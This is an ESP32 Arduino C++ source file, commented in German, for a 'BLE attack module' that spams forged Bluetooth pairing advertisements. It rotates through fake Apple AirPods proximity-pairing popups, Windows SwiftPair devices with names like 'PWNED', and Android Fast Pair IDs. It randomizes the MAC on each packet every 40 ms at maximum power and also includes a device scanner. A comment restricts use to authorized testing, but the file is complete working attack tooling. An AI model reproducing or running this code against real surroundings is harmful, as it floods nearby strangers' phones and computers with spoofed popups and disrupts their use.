// G4MEOVER — BLE-Angriffsmodul (Implementierung). Siehe ble_spam.h.
// NUR fuer autorisierte Security-Tests / eigene Hardware / CTF.
#include "ble_spam.h"
#include <Arduino.h>
#include <NimBLEDevice.h>
#include <string>

// Low-Level-NimBLE: setzt die (statische) Zufalls-Adresse pro Advertisement.
extern "C" int ble_hs_id_set_rnd(const uint8_t* rnd_addr);

#define BLE_SPAM_INTERVAL_MS  40      // Zeit zwischen zwei Advertisements

static bool     s_active  = false;
static bool     s_inited  = false;
static uint8_t  s_mode    = 0;        // 0=alle,1=Apple,2=Windows,3=Android
static uint8_t  s_rot     = 0;        // Rotationszaehler bei mode 0
static uint32_t s_last    = 0;

// ---- Payload-Bausteine ----------------------------------------------------
// Apple-Proximity-Pairing (Popup „Nicht deine AirPods…"). 2-Byte-Modell-Codes.
static const uint16_t APPLE_MODELS[] = {
    0x0220, 0x0e20, 0x0a20, 0x0055, 0x0030, 0x0f20, 0x1320, 0x1420,  // AirPods-Varianten u.a.
};
#define APPLE_MODEL_COUNT (sizeof(APPLE_MODELS) / sizeof(APPLE_MODELS[0]))

// Windows „SwiftPair"-Geraetenamen.
static const char* SWIFT_NAMES[] = { "G4MEOVER", "GAME OVER", "PWNED", "Insert Coin" };
#define SWIFT_NAME_COUNT (sizeof(SWIFT_NAMES) / sizeof(SWIFT_NAMES[0]))

// Android „Fast Pair"-Modell-IDs (3 Byte).
static const uint32_t FASTPAIR_IDS[] = { 0x0001F0, 0x00B727, 0x01E5CE, 0x02D815 };
#define FASTPAIR_ID_COUNT (sizeof(FASTPAIR_IDS) / sizeof(FASTPAIR_IDS[0]))

static void randomize_mac() {
    uint8_t mac[6];
    uint32_t a = esp_random(), b = esp_random();
    mac[0] = a; mac[1] = a >> 8; mac[2] = a >> 16;
    mac[3] = b; mac[4] = b >> 8; mac[5] = (b >> 16) | 0xC0;   // static-random: obere 2 Bits gesetzt
    ble_hs_id_set_rnd(mac);
}

static void adv_apple() {
    uint16_t model = APPLE_MODELS[esp_random() % APPLE_MODEL_COUNT];
    uint8_t d[17] = {
        0x4C, 0x00,             // Apple Company ID
        0x07, 0x0F,             // Typ 0x07 (Proximity Pairing), Laenge
        0x05, 0xC1,             // Sub-Typ + Prefix
        (uint8_t)(model >> 8), (uint8_t)(model & 0xFF),
        0x00,                   // Status
        0x00, 0x00, 0x00,       // Batterie/Flags
        0x00,
        (uint8_t)esp_random(), (uint8_t)esp_random(), (uint8_t)esp_random(),
        0x00,
    };
    NimBLEAdvertisementData ad;
    ad.setManufacturerData(std::string((char*)d, sizeof(d)));
    NimBLEDevice::getAdvertising()->setAdvertisementData(ad);
}

static void adv_windows() {
    const char* name = SWIFT_NAMES[esp_random() % SWIFT_NAME_COUNT];
    std::string d;
    d += (char)0x06; d += (char)0x00;   // Microsoft Company ID
    d += (char)0x03; d += (char)0x00;   // Scenario: SwiftPair
    d += (char)0x80;                    // Reserved/RSSI
    d += name;
    NimBLEAdvertisementData ad;
    ad.setManufacturerData(d);
    NimBLEDevice::getAdvertising()->setAdvertisementData(ad);
}

static void adv_android() {
    uint32_t id = FASTPAIR_IDS[esp_random() % FASTPAIR_ID_COUNT];
    std::string d;
    d += (char)(id >> 16); d += (char)(id >> 8); d += (char)(id & 0xFF);
    NimBLEAdvertisementData ad;
    ad.setServiceData(NimBLEUUID((uint16_t)0xFE2C), d);   // Fast Pair Service
    NimBLEDevice::getAdvertising()->setAdvertisementData(ad);
}

static void ensure_init() {
    if(s_inited) return;
    NimBLEDevice::init("");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    s_inited = true;
}

void ble_spam_start(uint8_t mode) {
    ensure_init();
    s_mode   = mode;
    s_active = true;
    s_last   = 0;
    Serial.printf("[BLE-SPAM] aktiv, mode=%u\n", mode);
}

void ble_spam_stop() {
    if(!s_active) return;
    NimBLEDevice::getAdvertising()->stop();
    s_active = false;
    Serial.println("[BLE-SPAM] gestoppt");
}

void ble_spam_tick() {
    if(!s_active) return;
    uint32_t now = millis();
    if(now - s_last < BLE_SPAM_INTERVAL_MS) return;
    s_last = now;

    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
    adv->stop();
    randomize_mac();

    uint8_t m = s_mode;
    if(m == 0) { m = (s_rot++ % 3) + 1; }   // 1..3 rotieren
    switch(m) {
        case 1: adv_apple();   break;
        case 2: adv_windows(); break;
        default: adv_android(); break;
    }
    adv->start();
}

bool ble_spam_active() { return s_active; }

uint8_t ble_scan(uint32_t dur_ms) {
    ensure_init();
    NimBLEScan* scan = NimBLEDevice::getScan();
    scan->setActiveScan(true);
    scan->setInterval(100);
    scan->setWindow(80);
    NimBLEScanResults res = scan->start(dur_ms / 1000 ? dur_ms / 1000 : 3, false);
    uint8_t n = res.getCount() > 255 ? 255 : res.getCount();
    for(uint8_t i = 0; i < n; i++) {
        NimBLEAdvertisedDevice d = res.getDevice(i);
        Serial.printf("  BLE[%u] %s rssi=%d %s\n", i,
                      d.getAddress().toString().c_str(), d.getRSSI(),
                      d.haveName() ? d.getName().c_str() : "");
    }
    scan->clearResults();
    return n;
}
